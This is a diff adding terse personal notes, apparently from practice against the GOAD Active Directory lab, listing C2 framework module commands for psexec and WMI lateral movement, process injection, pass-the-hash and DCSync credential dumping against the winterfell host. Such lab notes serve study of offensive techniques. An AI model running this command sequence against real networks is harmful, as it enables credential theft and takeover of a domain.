@@ -1,2 +1,77 @@
-usemodule psexec
-set listener http
+wmi (windows management instrumentation)
+  help admins to manage remote systems as execute commands on remote systems
+  end goal is to open agent on the remote machine
+
+inject on session for robb.stark
+  usemodule psexec
+  set listener http
+  make new listener
+    smb
+    set agent
+  // set listener smb
+  set ComputerName winterfell.north.sevenkingdoms.lacol
+  set listener http
+  execute
+
+  ps
+  use module processinjection
+  setpid 5292
+  set listener http
+  execute
+  usemodule psexec
+  set ComputerName winterfell
+  set listener http
+  execute
+
+  usemodule lateral_movement_invoke_wmi
+  set CredId 5
+  set Listener http
+  set ComputerName winterfell
+  execute
+  set credentials CredId
+
+  usemodule dcsync
+  set user eddard.stark
+  execute
+
+  usemodule wmi
+  set credentials CredId
+  set CredId 12
+  set ComputerName winterfell
+  set listener http
+  execute
+
+  usemodule pth
+  set CredId 12
+  execute
+
+  usemodule processinjection
+  set pid 6300
+  set listener http
+  execute
+
+36 min left
+  usemodule dcsync_hashdump
+  execute
+
+  usemodule minikatz_dcsync
+  set use Administrator
+  execute
+
+  ps
+  usemodule processinjection
+  set listener http
+  set pid 6604
+  execute
+    now on this agent
+    usemodule wmi
+    set Credentials CredID
+    set ComputerName winterfell
+    set CredID 13
+    set Listener http
+    execute
+
+    usemodule psexec
+    set listener http
+    set ComputerName 192.168.56.11
+    execute
